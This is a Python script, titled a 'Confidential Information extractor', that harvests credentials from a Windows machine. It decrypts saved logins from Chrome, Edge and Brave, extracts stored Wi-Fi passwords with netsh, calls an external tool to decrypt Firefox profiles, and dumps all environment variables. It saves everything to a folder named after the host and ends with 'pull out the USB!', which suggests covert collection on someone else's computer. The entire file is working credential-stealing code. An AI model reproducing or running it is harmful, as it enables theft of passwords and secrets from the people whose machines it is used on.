#!/usr/bin/env python3

### Confidential Information extractor
# Written by CABREX (https://github.com/0xcabrex/)
# This code works only for windows systems.

import subprocess
import socket
import os
from contextlib import redirect_stdout
# Normal multiprocessing doesnt work when you compile using pyinstaller to an exe file using --onefile.
# Hence, adding forking 
import multiprocessing
from multiprocessing import Process
import multiprocessing.popen_spawn_win32 as forking
import sys

win32cryptNotFound = False
AESNotFound = False
debugMode = False

import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

# EXE file support
class _Popen(forking.Popen):
    def __init__(self, *args, **kw):
        if hasattr(sys, 'frozen'):
            # We have to set original _MEIPASS2 value from sys._MEIPASS
            # to get --onefile mode working.
            os.putenv('_MEIPASS2', sys._MEIPASS)
        try:
            super(_Popen, self).__init__(*args, **kw)
        finally:
            if hasattr(sys, 'frozen'):
                # On some platforms (e.g. AIX) 'os.unsetenv()' is not
                # available. In those cases we cannot delete the variable
                # but only set it to the empty string. The bootloader
                # can handle this case.
                if hasattr(os, 'unsetenv'):
                    os.unsetenv('_MEIPASS2')
                else:
                    os.putenv('_MEIPASS2', '')

class Process(Process):
    _Popen = _Popen



def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key(browser):

    if browser == "chrome":
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
    elif browser == "brave":
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                        "User Data", "Local State")
    elif browser == "edge":
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Microsoft", "Edge",
                                        "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def chromePass(browser):
    # get the AES key
    key = get_encryption_key(browser)
    # local sqlite Chrome database path
    # for different chromium based broswers the location is different

    # db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
    #                         "Google", "Chrome", "User Data", "default", "Login Data")
    if browser == "chrome":
        db_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "ChromeData.db"    

    elif browser == "brave":
        db_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                        "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "braveData.db"

    elif browser == "edge":
        db_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Microsoft", "Edge",
                                        "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "EdgeData.db"
                                        
    
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def wifi_password_extractor_windows():
    metaData = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell = True)
    data = metaData.decode('utf-8', errors = "backslashreplace").split('\n')
    profiles = []

    for element in data:
        if "All User Profile" in element:
            token = element.split(":")
            # print(token[1].strip())
            profiles.append(token[1].strip())

    print("{:<33}| {:<}".format("Wi-Fi Name", "Password"))
    print("----------------------------------------------")

    for element in profiles:
        try:
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', element, 'key=clear'], shell=True).decode('utf8', errors='backslashreplace').split('\n')
            result = [b.split(":")[1][1:-1] for b in result if "Key Content" in b]
            try:
                print("{:<33}| {:<}".format(element, result[0]))

                # else it will print blank in front of pass word
            except IndexError:
                print("{:<33}| {:<}".format(element, ""))

        except subprocess.CalledProcessError:
            pass

def environDumper():
    envi_vars = list(os.environ)

    dataList = []

    for element in envi_vars:
        data = {}
        value = os.environ.get(element)
        data["key"] = element
        data["value"] = value
        dataList.append(data)

    finalData = {}
    finalData["ENVIRON_VARS"] = dataList

    print(json.dumps(finalData, indent=1))


###############################################################################################################################################
#                                                               Redirectors                                                                   #
###############################################################################################################################################



def redirector_for_wifi_password_extractor_windows(hostname):
    with open(f"{hostname}/wifiDump.txt", "w") as file:
            with redirect_stdout(file):
                wifi_password_extractor_windows()


def redirector_for_chromePass(hostname):
        with open(f"{hostname}/chromeDump.txt", "w") as file:
                with redirect_stdout(file):
                    try:
                        chromePass("chrome")
                    except:
                        pass

def redirector_for_edge(hostname):
    with open(f"{hostname}/edgeDump.txt", "w") as file:
            with redirect_stdout(file):
                try:
                    chromePass("edge")
                except:
                    pass

def redirector_for_brave(hostname):
    with open(f"{hostname}/braveDump.txt", "w") as file:
            with redirect_stdout(file):
                try:
                    chromePass("brave")
                except:
                    pass


def redirector_for_firefoxDecrypt(hostname):
    with open(f"{hostname}/firefoxDump.txt", "w") as file:
        with redirect_stdout(file):
            for i in range(1,10):
                try:
                    metaData = subprocess.check_output(['firefoxDecrypt.exe', '-n', '-c', f'{i}'], shell=True, stderr=open(os.devnull, 'wb')).decode('utf-8', errors='backslashreplace')
                    print("----------------------------------------------")
                    print(f"For profile: {i}\n")
                    print(metaData)

                except subprocess.CalledProcessError as e:
                    if e.returncode == 32:
                        sys.exit(0)

def redirector_for_environDumper(hostname):
    with open(f"{hostname}/environment_variables.json", "w") as file:
        with redirect_stdout(file):
            environDumper()


###############################################################################################################################################
#                                                               Main Program                                                                  #
###############################################################################################################################################



if __name__ == "__main__":

    multiprocessing.freeze_support()

    hostname = socket.gethostname()
    
    if not os.path.isdir(hostname):
        os.mkdir(hostname)

    if debugMode:
        print(f"win32crypt: {not win32cryptNotFound}\nAES Decryptor: {not AESNotFound}")

    # Creating processes

    wifi_dump_process = Process(target=redirector_for_wifi_password_extractor_windows, args=[hostname])
    if not AESNotFound and not win32cryptNotFound:
        chromePass_process = Process(target=redirector_for_chromePass, args=[hostname])
        edge_process = Process(target=redirector_for_edge, args=[hostname])
        brave_process = Process(target=redirector_for_brave, args=[hostname])
    firefoxDecrypt_process = Process(target=redirector_for_firefoxDecrypt, args=[hostname])
    environDumper_process = Process(target=redirector_for_environDumper, args=[hostname])
    
    # Starting and joining the processes

    wifi_dump_process.start()
    if not AESNotFound and not win32cryptNotFound:
        chromePass_process.start()
        edge_process.start()
        brave_process.start()
    firefoxDecrypt_process.start()
    environDumper_process.start()
    
    firefoxDecrypt_process.join()
    if not AESNotFound and not win32cryptNotFound:
        chromePass_process.join()
        edge_process.join()
        brave_process.join()
    wifi_dump_process.join()
    environDumper_process.join()

    
    print("Done... pull out the USB!")
        